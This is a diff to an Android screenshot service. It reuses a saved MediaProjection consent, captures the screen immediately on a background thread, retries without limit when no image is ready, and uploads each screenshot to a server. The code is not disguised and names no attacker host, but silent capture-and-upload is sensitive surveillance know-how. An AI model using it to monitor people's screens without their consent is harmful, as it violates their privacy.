@@ -170,23 +170,27 @@ class ScreenshotCaptureService : Service() {
                 if (mediaProjection != null) {
                     Log.i(TAG, "Using existing MediaProjection for capture")
                     setupVirtualDisplay()
+
+                    // Capture immediately, no delay
+                    captureSingleScreenshot()
+
+                    // Cleanup after capture completes
                     handler.postDelayed({
-                        captureSingleScreenshot()
-                        handler.postDelayed({
-                            cleanupVirtualDisplay()
-                        }, 1000)
-                    }, 500)
+                        cleanupVirtualDisplay()
+                    }, 500) // Only need 500ms for capture to complete
                 }
                 else if (savedResultCode != -1 && savedIntentUri != null) {
                     val data = Intent.parseUri(savedIntentUri, 0)
                     setupMediaProjection(savedResultCode, data)
                     setupVirtualDisplay()
+
+                    // Capture immediately
+                    captureSingleScreenshot()
+
+                    // Cleanup after capture completes
                     handler.postDelayed({
-                        captureSingleScreenshot()
-                        handler.postDelayed({
-                            cleanupVirtualDisplay()
-                        }, 1000)
-                    }, 500)
+                        cleanupVirtualDisplay()
+                    }, 500) // Only need 500ms for capture to complete
                 } else {
                     Log.e(TAG, "No MediaProjection available for single capture")
                 }
@@ -229,31 +233,41 @@ class ScreenshotCaptureService : Service() {
 
         try {
             val image = imageReader?.acquireLatestImage()
-            Log.d(TAG, "Image acquired: ${image != null}")
 
             if (image != null) {
-                val planes = image.planes
-                val buffer = planes[0].buffer
-                val pixelStride = planes[0].pixelStride
-                val rowStride = planes[0].rowStride
-                val rowPadding = rowStride - pixelStride * screenWidth
+                // Use a background thread for processing
+                Thread {
+                    try {
+                        val planes = image.planes
+                        val buffer = planes[0].buffer
+                        val pixelStride = planes[0].pixelStride
+                        val rowStride = planes[0].rowStride
+                        val rowPadding = rowStride - pixelStride * screenWidth
 
-                val bitmap = Bitmap.createBitmap(
-                    screenWidth + rowPadding / pixelStride,
-                    screenHeight,
-                    Bitmap.Config.ARGB_8888
-                )
-                bitmap.copyPixelsFromBuffer(buffer)
+                        val bitmap = Bitmap.createBitmap(
+                            screenWidth + rowPadding / pixelStride,
+                            screenHeight,
+                            Bitmap.Config.ARGB_8888
+                        )
+                        bitmap.copyPixelsFromBuffer(buffer)
 
-                // Crop to actual screen dimensions
-                val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)
+                        val croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)
 
-                // Upload to server
-                uploadScreenshot(croppedBitmap)
+                        // Upload on background thread
+                        uploadScreenshot(croppedBitmap)
 
-                bitmap.recycle()
-                croppedBitmap.recycle()
-                image.close()
+                        bitmap.recycle()
+                        croppedBitmap.recycle()
+                        image.close()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error processing screenshot: ${e.message}")
+                    }
+                }.start()
+            } else {
+                // If no image available, try again quickly
+                handler.postDelayed({
+                    captureSingleScreenshot()
+                }, 100)
             }
         } catch (e: Exception) {
             Log.e(TAG, "Failed to capture single screenshot: ${e.message}")
